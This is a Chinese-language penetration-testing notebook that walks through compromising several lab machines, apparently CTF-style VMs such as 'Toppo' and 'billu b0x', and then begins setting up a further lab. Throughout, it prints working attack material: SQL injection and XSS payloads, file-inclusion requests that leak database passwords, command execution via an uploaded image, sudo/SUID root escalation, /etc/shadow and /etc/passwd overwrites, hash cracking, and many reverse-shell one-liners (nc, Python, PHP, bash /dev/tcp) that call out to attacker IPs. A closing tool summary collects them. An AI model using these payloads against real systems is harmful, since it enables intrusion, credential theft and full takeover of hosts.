[09:12:06] 301 -  315B  - /manual  ->  http://192.168.70.45/manual/         
[09:12:06] 200 -  201B  - /manual/index.html
[09:12:09] 200 -  256KB - /package-lock.json                                
[09:12:09] 200 -    1KB - /package.json
[09:12:12] 200 -    3KB - /post.html                                        
[09:12:13] 200 -    4KB - /README.md                                     
[09:12:21] 200 -  479B  - /vendor/
```

### dirb

```bash
man dirb
dirb http://192.168.70.45 -r
dirb http://192.168.70.45 -r -o 2.txt
```



```bash
---- Scanning URL: http://192.168.70.45/ ----
==> DIRECTORY: http://192.168.70.45/admin/                                                                                                     
==> DIRECTORY: http://192.168.70.45/css/                                                                                                       
==> DIRECTORY: http://192.168.70.45/img/                                                                                                       
+ http://192.168.70.45/index.html (CODE:200|SIZE:6437)                                                                                         
==> DIRECTORY: http://192.168.70.45/js/                                                                                                        
+ http://192.168.70.45/LICENSE (CODE:200|SIZE:1093)                                                                                            
==> DIRECTORY: http://192.168.70.45/mail/                                                                                                      
==> DIRECTORY: http://192.168.70.45/manual/                                                                                                    
+ http://192.168.70.45/server-status (CODE:403|SIZE:301)                                                                                       
==> DIRECTORY: http://192.168.70.45/vendor/
```



### 访问目录

#### 密码

http://192.168.70.45/admin/notes.txt

```bash
Note to myself :

I need to change my password :ted/ted123#@! is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .
```

> ted/ted123#@!



联系我：http://192.168.70.45/mail/contact_me.php

apache2.4.10：http://192.168.70.45/manual/zh-cn/index.html

package-lock：http://192.168.70.45/package-lock.json

package：http://192.168.70.45/package.json

http://192.168.70.45/vendor/

http://192.168.70.45/contact.html

http://192.168.70.45/post.html

readme：http://192.168.70.45/README.md 

#### 查看github源码

http://192.168.70.45/README.md 

https://github.com/BlackrockDigital/startbootstrap-clean-blog

```bash
git clone https://github.com/StartBootstrap/startbootstrap-clean-blog.git
```

#### burpsuite抓包

http://192.168.70.45/contact.html

http://192.168.70.45/mail/contact_me.php

```bash
POST /mail/contact_me.php HTTP/1.1
Host: 192.168.70.45
Content-Length: 91
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.70.45
Referer: http://192.168.70.45/contact.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

name=1&phone=13600000001&email=123%40qq.com&message=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E
```

## rpcbind

https://www.cnblogs.com/lnterpreter/p/15504651.html

https://blog.csdn.net/zwm_20211031_475/article/details/127578632

rpcbind是NFS中 用来进行消息通知的服务。

一般情况 下rpcbind运行在111端口。并且NFS配置开 启`rpcbind_ enable="YES"`

RPC 最主要的功能就是在指定每个 NFS 功能所对应的端口序号（port number ），并且回报给客户端，让客户端可以连结到正确的物理端口（port）上去。

### nmap

```bash
nmap -sV -p 111 192.168.70.45			   #探测rpcbind版本信息
nmap -p 111 --script=rpcbind 192.168.70.45	#探测目标的rpcinfo信息
```

### msf

```bash
#搜索相关漏洞
searchsploit rpcbind

msfconsole
search rpcbind
use auxiliary/dos/rpc/rpcbomb
show options
set RHOSTS  192.168.70.45
run

#SunRPC Portmap程序枚举器
//此模块调用目标端口映射服务并枚举所有程序条目及其运行端口号。
use auxiliary/scanner/misc/sunrpc_portmapper
show options
set RHOSTS  192.168.70.45
run

```

拒绝服务攻击

```bash
┌──(root㉿kali)-[~/Desktop/learn/2]
└─# searchsploit rpcbind
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
rpcbind - CALLIT procedure UDP Crash (PoC)                                                                     | linux/dos/26887.rb
RPCBind / libtirpc - Denial of Service                                                                         | linux/dos/41974.rb
Wietse Venema Rpcbind Replacement 2.1 - Denial of Service                                                      | unix/dos/20376.txt
```



```bash
[+] 192.168.70.45:111     - SunRPC Programs for 192.168.70.45
=================================

 Name     Number  Version  Port   Protocol
 ----     ------  -------  ----   --------
 rpcbind  100000  4        111    tcp
 rpcbind  100000  3        111    tcp
 rpcbind  100000  2        111    tcp
 rpcbind  100000  4        111    udp
 rpcbind  100000  3        111    udp
 rpcbind  100000  2        111    udp
 status   100024  1        53381  udp
 status   100024  1        36907  tcp
```

## 3.ssh

> ted/ted123#@!

```bash
ssh ted@192.168.70.45
ted123#@!

id
ls -la
cat .bash_history
find / -perm -u=s -type f 2>/dev/null
cat /etc/sudoers
awk 'BEGIN {system("cat /root/flag.txt")}'
/usr/bin/python2.7 -c 'import pty;pty.spawn("/bin/sh")'

whoami
cd /root
ls
cat /root/flag.txt
```

### flag

```bash
ted@Toppo:~$ id
uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
ted@Toppo:~$ ls -al
total 24
drwxr-xr-x 2 ted  ted  4096 Dec  3 09:19 .
drwxr-xr-x 3 root root 4096 Apr 15  2018 ..
-rw-r--r-- 1 ted  ted     0 Dec  3 09:33 a
-rw------- 1 ted  ted  2533 Dec  3 11:59 .bash_history
-rw-r--r-- 1 ted  ted   220 Apr 15  2018 .bash_logout
-rw-r--r-- 1 ted  ted  3515 Apr 15  2018 .bashrc
-rw-r--r-- 1 ted  ted   675 Apr 15  2018 .profile


ted@Toppo:~$ cat .bash_history

find / -perm -u=s -type f 2>/dev/null
mawk 'BEGIN {system("/bin/sh")}'
history
python2.7 -c 'import pty;pty.spawn("/bin/sh")'
whoami
sudo awk 'BEGIN {system("/bin/sh")}'
cd /usr/bin
awk 'BEGIN {system("/bin/sh")}'
/usr/bin/awk 'BEGIN {system("/bin/sh")}'
nc -e /bin/bash 192.168.5.136 6666
cd /bin
ls
ls
pwd
cd /root/
ls
sudo
su root
find / -perm -u=s -type f 2>/dev/null
/usr/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.5.129",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
ifconfig
ipconfig
sudo ifconfig
/usr/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.5.129",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
whoami
find / -perm -u=s -type f 2>/dev/null
/usr/bin/python2.7 -c import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.110.131",4444));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
/usr/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.5.136",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
cat /etc/sudoers
clear
cat /etc/sudoers
awk 'BEGIN {system("whoami")}'
awk 'BEGIN {system("find / -name flag.txt")}'
awk 'BEGIN {system("cat /root/flag.txt")}'
sudo su
su root
whoami
find / -perm -u=s -type f 2>/dev/null

find / -perm -u=s -type f 2>/dev/null
/usr/bin/python2.7 -c import os;os.execl("/bin/sh","sh","-p")'
./python -c import os;os.execl("/bin/sh","sh","-p")'
/usr/bin/python2.7 -c 'import pty;pty.spawn("/bin/sh")'
clear
/usr/bin/python2.7 -c 'import pty;pty.spawn("/bin/sh")'
clear
exit
clear
/usr/bin/python2.7 -c 'import pty;pty.spawn("/bin/sh")'
clear
/usr/bin/python2.7 -c 'import pty;pty.spawn("/bin/sh")'
clear
/usr/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.5.136",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
clear
/usr/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.5.136",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
exit


ted@Toppo:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/sbin/exim4
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/python2.7
/usr/bin/chsh
/usr/bin/at
/usr/bin/mawk
/usr/bin/chfn
/usr/bin/procmail
/usr/bin/passwd
/bin/su
/bin/umount
/bin/mount

ted@Toppo:~$ cat /etc/sudoers
ted ALL=(ALL) NOPASSWD: /usr/bin/awk

ted@Toppo:~$ /usr/bin/python2.7 -c 'import pty;pty.spawn("/bin/sh")'
# whoami
root
# ls
a
# cd /root
# ls
flag.txt
# cat flag.txt
_________
|  _   _  |
|_/ | | \_|.--.   _ .--.   _ .--.    .--.
    | |  / .'`\ \[ '/'`\ \[ '/'`\ \/ .'`\ \
   _| |_ | \__. | | \__/ | | \__/ || \__. |
  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'
                 [__|     [__|




Congratulations ! there is your flag : {lysys_sjwa_passW0rd}
```

> flag : {lysys_sjwa_passW0rd}

### linux提权

#### /etc/shadow可读

```bash
cat /etc/shadow
```

##### 查看/etc/shadow

```bash
root:$6$B9.UXcjg$brLv7w6QMynNKEyVL0gyUnSPB1x/wbXjR7tTOUv0woXAzKPuOVStwp2utuDmlUs4pOq.HBykUcFsnY/9mlPpx0
ted:$6$GP8Nd43M$WUIiEtNuWqGjmtPhrXBmsHYmq0jeelOC9eS0AShbgng26ioWhPu1.3vnQhVy/8.BOAop4li1bPTFvzQOLBMuT/
```

##### john破解hash

```bash
john 1.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash
mkpasswd -m sha-512 newpassword
```

#### /etc/shadow文件可写

```bash
ls -l /etc/shadow 
```

##### 生成sha-512的hash

```bash
mkpasswd -m sha-512 newpassword
```



```bash
$6$p.wS9y3xl4i$Rh0DvYER94lLT/tnrdbO9l16Bn773.6peomyKGx0XZUreOX.BCZuJNwrr91h5HBOFmoGH7uJz.BfVnbdoKCE71
```

##### 替换/etc/shadow文件

```bash
cp /etc/shadow /etc/shadow.bak
vim /etc/shadow

root:$6$p.wS9y3xl4i$Rh0DvYER94lLT/tnrdbO9l16Bn773.6peomyKGx0XZUreOX.BCZuJNwrr91hh5HBOFmoGH7uJz.BfVnbdoKCE71:19695:0:99999:7:::
```



```bash
su root
newpassword
```

#### 可写passwd文件

```bash
ls -l /etc/passwd
```

##### 生成密码hash值

```bash
openssl passwd 123456
```

```bash
$1$RaMnajbK$uPG5NxGvTjJ3LNXnLKvye/
```

##### 替换" x"

```bash
cp /etc/passwd /tmp/passwd.bak
vim /etc/passwd

root:$1$RaMnajbK$uPG5NxGvTjJ3LNXnLKvye/:0:0:root:/root:/bin/bash
```



```bash
su root

123456
```

##### 查看SUDO权限

```bash
cat /etc/sudoers
```



```bash
ted ALL=(ALL) NOPASSWD: /usr/bin/awk
```



```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

##### 查找SUID文件

```bash
find / -user root -perm -u=s -type f 2>/dev/null
```

指定查找设置了SetUID（设置用户ID）权限的文件。

```bash
/usr/bin/mawk
/usr/bin/python2.7
```



```bash
mawk 'BEGIN {system("/bin/sh")}'
/usr/bin/python2.7 -c 'import pty;pty.spawn("/bin/sh")'
```



## 工具总结

### linux提权

```bash
#匹配设置了 setuid 权限的文件
find / -perm -u=s -type f 2>/dev/null
cat /etc/sudoers

#提权
mawk 'BEGIN {system("/bin/sh")}'

awk 'BEGIN {system("/bin/sh")}'
/usr/bin/awk 'BEGIN {system("/bin/sh")}'
awk 'BEGIN {system("whoami")}'
awk 'BEGIN {system("find / -name flag.txt")}'
awk 'BEGIN {system("cat /root/flag.txt")}'

python2.7 -c 'import pty;pty.spawn("/bin/sh")'
python2.7 -c 'import subprocess;p=subprocess.call(["/bin/sh","-i"]);'

#kali监听
nc -nclp 6666
#正向连接
##nc
nc -e /bin/bash 192.168.70.4 6666

##python2.7
###正向连接并提权
/usr/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.70.4",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'


/usr/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.70.4",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

# 靶机3

wp:https://www.cnblogs.com/koka/p/17357459.html

## nmap

```bash
nmap -sCV 192.168.70.0/24
```



```bash
Nmap scan report for 192.168.70.46 (192.168.70.46)
Host is up (0.00070s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 fa:cf:a2:52:c4:fa:f5:75:a7:e2:bd:60:83:3e:7b:de (DSA)
|   2048 88:31:0c:78:98:80:ef:33:fa:26:22:ed:d0:9b:ba:f8 (RSA)
|_  256 0e:5e:33:03:50:c9:1e:b3:e7:51:39:a4:4a:10:64:ca (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: --==[[IndiShell Lab]]==--
MAC Address: 00:0C:29:E0:17:3F (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



```bash
nmap -sU 192.168.70.46
```

> 22,80

## 目录扫描

### dirsearch

#### http://192.168.70.46

```bash
dirsearch -u http://192.168.70.46
```



```bash
[15:50:50] 200 -  307B  - /add.php                                          
[15:50:50] 200 -  307B  - /add                                              
[15:50:58] 200 -    1B  - /c 
[15:51:04] 200 -    3KB - /head                                             
[15:51:04] 200 -    3KB - /head.php                                         
[15:51:05] 301 -  249B  - /images  ->  http://192.168.70.46/images/         
[15:51:05] 200 -  501B  - /images/                                          
[15:51:05] 200 -   47KB - /in                                               
[15:51:12] 302 -    2KB - /panel  ->  index.php                             
[15:51:12] 302 -    2KB - /panel.php  ->  index.php                         
[15:51:13] 200 -    8KB - /phpmy/                   
[15:51:18] 200 -    1B  - /show                                             
[15:51:21] 200 -   72B  - /test                                             
[15:51:21] 200 -   72B  - /test.php
```

文件上传：http://192.168.70.46/add.php 

http://192.168.70.46/panel.php

phpMyAdmin：http://192.168.70.46/phpmy/

http://192.168.70.46/show.php

文件包含：http://192.168.70.46/test.php

phpinfo：http://192.168.70.46/in

> 网站根目录：/var/www

#### /phpmy

```bash
dirsearch -u http://192.168.70.46/phpmy
```



```bash
[17:34:54] 301 -  250B  - /phpmy/js  ->  http://192.168.70.46/phpmy/js/
[17:35:09] 200 -   28KB - /phpmy/ChangeLog                                  
[17:35:10] 200 -    0B  - /phpmy/config.inc                                 
[17:35:10] 200 -    0B  - /phpmy/config.inc.php                             
[17:35:11] 200 -  227B  - /phpmy/CREDITS                                    
[17:35:13] 200 -  965B  - /phpmy/docs                                       
[17:35:15] 200 -  244KB - /phpmy/Documentation.html                         
[17:35:16] 200 -   18KB - /phpmy/favicon.ico                                
[17:35:20] 200 -  128B  - /phpmy/INSTALL                                    
[17:35:21] 200 -    3KB - /phpmy/js/config.js                               
[17:35:21] 200 -  896B  - /phpmy/js/                                        
[17:35:21] 301 -  254B  - /phpmy/libraries  ->  http://192.168.70.46/phpmy/libraries/
[17:35:22] 200 -    2KB - /phpmy/libraries/                                 
[17:35:22] 200 -   18KB - /phpmy/LICENSE                                    
[17:35:28] 200 -   41KB - /phpmy/phpmyadmin                                 
[17:35:29] 200 -  312B  - /phpmy/print                                      
[17:35:30] 200 -    2KB - /phpmy/README                                     
[17:35:31] 200 -   46B  - /phpmy/robots.txt                                 
[17:35:32] 301 -  253B  - /phpmy/scripts  ->  http://192.168.70.46/phpmy/scripts/
[17:35:32] 200 -  641B  - /phpmy/scripts/                                   
[17:35:33] 301 -  251B  - /phpmy/setup  ->  http://192.168.70.46/phpmy/setup/
[17:35:33] 200 -   11KB - /phpmy/setup/                                     
[17:35:37] 301 -  252B  - /phpmy/themes  ->  http://192.168.70.46/phpmy/themes/
[17:35:37] 200 -  513B  - /phpmy/themes/
[17:35:37] 200 -  190B  - /phpmy/TODO
```

> /phpmy/config.inc.php

## sql注入

http://192.168.70.46

```bash
http://192.168.70.46/

login=let's+login&ps=\&un=' or 1=1 #
```

## 文件上传

http://192.168.70.46/panel.php

### Add

文件上传：http://192.168.70.46/add.php

```bash
POST /panel.php HTTP/1.1
Host: 192.168.70.46
Content-Length: 26
Cache-Control: max-age=0
Origin: http://192.168.70.46
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.46/panel.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9d1gbt6tl01gh301ffnjffgn07
Connection: keep-alive

load=add&continue=continue
```



### show

http://192.168.70.46/show.php

```bash
POST /panel.php HTTP/1.1
Host: 192.168.70.46
Content-Length: 27
Cache-Control: max-age=0
Origin: http://192.168.70.46
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.46/panel.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9d1gbt6tl01gh301ffnjffgn07
Connection: keep-alive

load=show&continue=continue
```

http://192.168.70.46/uploaded_images/xxx.png

http://192.168.70.46/uploaded_images/



## 文件包含

http://192.168.70.46/test.php

### panel.php

```bash
<?php
session_start();

include('c.php');
include('head2.php');
if(@$_SESSION['logged']!=true )
{
		header('Location: index.php', true, 302);
		exit();
	
}



echo "Welcome to billu b0x ";
echo '<form method=post style="margin: 10px 0px 10px 95%;"><input type=submit name=lg value=Logout></form>';
if(isset($_POST['lg']))
{
	unset($_SESSION['logged']);
	unset($_SESSION['admin']);
	header('Location: index.php', true, 302);
}
echo '<hr><br>';

echo '<form method=post>

<select name=load>
    <option value="show">Show Users</option>
	<option value="add">Add User</option>
</select> 

 &nbsp<input type=submit name=continue value="continue"></form><br><br>';
if(isset($_POST['continue']))
{
	$dir=getcwd();
	$choice=str_replace('./','',$_POST['load']);
	
	if($choice==='add')
	{
       		include($dir.'/'.$choice.'.php');
			die();
	}
	
        if($choice==='show')
	{
        
		include($dir.'/'.$choice.'.php');
		die();
	}
	else
	{
		include($dir.'/'.$_POST['load']);
	}
	
}


if(isset($_POST['upload']))
{
	
	$name=mysqli_real_escape_string($conn,$_POST['name']);
	$address=mysqli_real_escape_string($conn,$_POST['address']);
	$id=mysqli_real_escape_string($conn,$_POST['id']);
	
	if(!empty($_FILES['image']['name']))
	{
		$iname=mysqli_real_escape_string($conn,$_FILES['image']['name']);
	$r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION);
	$image=array('jpeg','jpg','gif','png');
	if(in_array($r,$image))
	{
		$finfo = @new finfo(FILEINFO_MIME); 
	$filetype = @$finfo->file($_FILES['image']['tmp_name']);
		if(preg_match('/image\/jpeg/',$filetype )  || preg_match('/image\/png/',$filetype ) || preg_match('/image\/gif/',$filetype ))
				{
					if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name']))
							 {
							  echo "Uploaded successfully ";
							  $update='insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')'; 
							 mysqli_query($conn, $update);
							  
							}
				}
			else
			{
				echo "<br>i told you dear, only png,jpg and gif file are allowed";
			}
	}
	else
	{
		echo "<br>only png,jpg and gif file are allowed";
		
	}
}


}

?>
```



### show.php

http://192.168.70.46/show.php

```bash
POST /test.php HTTP/1.1
Host: 192.168.70.46
Content-Length: 13
Pragma: no-cache
Cache-Control: no-cache
Origin: http://192.168.70.46
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.46/test.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9d1gbt6tl01gh301ffnjffgn07
Connection: keep-alive

file=show.php
```



```bash
<?php
include('c.php');

if(isset($_POST['continue']))
{
	$run='select * from users ';
	$result = mysqli_query($conn, $run);
if (mysqli_num_rows($result) > 0) {
echo "<table width=90% ><tr><td>ID</td><td>User</td><td>Address</td><td>Image</td></tr>";
 while($row = mysqli_fetch_assoc($result)) 
   {
	   echo '<tr><td>'.$row['id'].'</td><td>'.htmlspecialchars ($row['name'],ENT_COMPAT).'</td><td>'.htmlspecialchars ($row['address'],ENT_COMPAT).'</td><td><img src="uploaded_images/'.htmlspecialchars ($row['image'],ENT_COMPAT).'" height=90px width=100px></td></tr>';
}
   echo "</table>";
}
}

?>
```



```bash
http://192.168.70.46/show.php

continue=1
```

### c.php

```bash
POST /test.php HTTP/1.1
Host: 192.168.70.46
Content-Length: 10
Pragma: no-cache
Cache-Control: no-cache
Origin: http://192.168.70.46
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.46/test.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9d1gbt6tl01gh301ffnjffgn07
Connection: keep-alive

file=c.php
```



```bash
<?php
#header( 'Z-Powered-By:its chutiyapa xD' );
header('X-Frame-Options: SAMEORIGIN');
header( 'Server:testing only' );
header( 'X-Powered-By:testing only' );

ini_set( 'session.cookie_httponly', 1 );

$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");

// Check connection
if (mysqli_connect_errno())
  {
  echo "connection failed ->  " . mysqli_connect_error();
  }

?>
```

> billu / b0x_billu

### config.inc.php

> phpmy/config.inc.php

```bash
POST /test.php HTTP/1.1
Host: 192.168.70.46
Content-Length: 25
Pragma: no-cache
Cache-Control: no-cache
Origin: http://192.168.70.46
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.46/test.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9d1gbt6tl01gh301ffnjffgn07
Connection: keep-alive

file=phpmy/config.inc.php
```



```bash
<?php

/* Servers configuration */
$i = 0;

/* Server: localhost [1] */
$i++;
$cfg['Servers'][$i]['verbose'] = 'localhost';
$cfg['Servers'][$i]['host'] = 'localhost';
$cfg['Servers'][$i]['port'] = '';
$cfg['Servers'][$i]['socket'] = '';
$cfg['Servers'][$i]['connect_type'] = 'tcp';
$cfg['Servers'][$i]['extension'] = 'mysqli';
$cfg['Servers'][$i]['auth_type'] = 'cookie';
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = 'Root123#@!';
$cfg['Servers'][$i]['AllowNoPassword'] = true;

/* End of servers configuration */

$cfg['DefaultLang'] = 'en-utf-8';
$cfg['ServerDefault'] = 1;
$cfg['UploadDir'] = '';
$cfg['SaveDir'] = '';


/* rajk - for blobstreaming */
$cfg['Servers'][$i]['bs_garbage_threshold'] = 50;
$cfg['Servers'][$i]['bs_repository_threshold'] = '32M';
$cfg['Servers'][$i]['bs_temp_blob_timeout'] = 600;
$cfg['Servers'][$i]['bs_temp_log_threshold'] = '32M';


?>
```

> root / Root123#@!

## phpmyadmin

http://192.168.70.46/phpmy

> billu / b0x_billu

### 网站账号

```bash
onePiece / luffy_!@#
```

## 命令执行

```bash
POST /panel.php HTTP/1.1
Host: 192.168.70.46
Content-Length: 67
Cache-Control: max-age=0
Origin: http://192.168.70.46
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.46/panel.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9d1gbt6tl01gh301ffnjffgn07
Connection: keep-alive

load=/uploaded_images/xxx.png&continue=continue&xxx=system(whoami);
```

![image-20241210163820848](https://image.201068.xyz/assets/16.高级渗透测试实操(寻找立足点)/image-20241210163820848.png)

> www-data

## 反弹shell

### kali监听

```bash
nc -lvnp 4444
```



```bash
php -r '$sock=fsockopen("192.168.70.4",4444);exec("/bin/bash <&3 >&3 2>&3");'

/bin/bash -i >& /dev/tcp/192.168.70.4/4444 0>&1
```

```bash
POST /panel.php HTTP/1.1
Host: 192.168.70.46
Content-Length: 63
Cache-Control: max-age=0
Origin: http://192.168.70.46
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.46/panel.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9d1gbt6tl01gh301ffnjffgn07
Connection: keep-alive

load=/uploaded_images/xxx.png&continue=continue&xxx=php+-r+'$sock%3dfsockopen("192.168.70.4",4444)%3bexec("/bin/bash+<%263+>%263+2>%263")%3b'
```



## ssh

> root / Root123#@!

```bash
ssh root@192.168.70.46
Root123#@!

cat /root/flag.txt
```

### flag

> flag : {Lysys_2024_!$#@}

# 靶机4

## 靶场环境配置

### 外网linux服务器

> 10.223.82.21
>
> 192.168.8.88
>
> 域名：www.cf1.com

### 连接配置

#### ip

```bash
10.223.47.114
255.255.255.0
10.223.47.254
```



```bash
vim /etc/network/interfaces
auto eth1
iface eth1 inet static
address 10.223.47.250
netmask 255.255.255.0
gateway 10.223.47.254
```



#### 路由

终端管理员权限

```bash
route -p add 10.223.82.0 mask 255.255.255.0 10.223.47.254 metric 1
route print

route delete 10.223.82.0
route delete 10.223.20.0
route delete 10.223.21.0
route delete 192.168.88.0

route add -net 10.223.82.0 netmask 255.255.255.0 gw 10.223.47.254
route -n
```



```bash
 curl -I http://www.cf1.com/
```



#### host

```bash
10.223.82.21 www.cf1.com
```



```bash
#windows
echo 10.223.82.21 www.cf1.com >> C:\Windows\System32\drivers\etc\hosts

#linux
echo "10.223.82.21 www.cf1.com" >>/etc/hosts
```

## 1.外网web—ubuntu

### nmap

```bash
nmap -sCV 10.223.82.21
nmap -sCV 10.223.82.0/24
```



```bash
# nmap -sCV 10.223.82.21
Starting Nmap 7.92 ( https://nmap.org ) at 2024-12-13 09:43 �й���׼ʱ��
Nmap scan report for www.cf1.com (10.223.82.21)
Host is up (0.0056s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
21/tcp   open  tcpwrapped
22/tcp   open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http       Apache httpd
